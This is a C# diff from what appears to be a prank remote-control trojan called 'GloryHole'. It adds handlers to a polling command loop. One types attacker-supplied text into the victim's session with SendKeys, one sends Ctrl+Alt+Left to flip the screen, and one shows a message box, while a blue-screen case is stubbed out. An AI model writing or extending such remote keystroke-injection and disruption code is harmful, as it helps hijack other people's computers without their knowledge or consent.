@@ -53,11 +53,16 @@ namespace GloryHole
                                 case (CommandTypes.Cursor): /*Ели курсор поменять нада */
                                     break;
                                 case (CommandTypes.SwapScreen):/*Ели нада экран перевернуть */
+                                    swap();
                                     break;
                                 case (CommandTypes.WriteText):/*Ели текс нада написать */
+                                    WriteText(cmd.text);
                                     break;
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
                                     //BSOD();
+                                    break;
+                                case (CommandTypes.MessageBox):
+                                    MessageBox.Show("sdf");
                                     break;
                             }
                         }
@@ -71,6 +76,18 @@ namespace GloryHole
                 Thread.Sleep(500);
             }
         }//sda
+
+        public static void WriteText(string txt)
+        {
+            System.Windows.Forms.SendKeys.SendWait(txt);
+        }
+
+
+
+        public static void swap()
+        {
+            System.Windows.Forms.SendKeys.SendWait("^%{LEFT}");
+        }
 
 
         public static void helloVania()
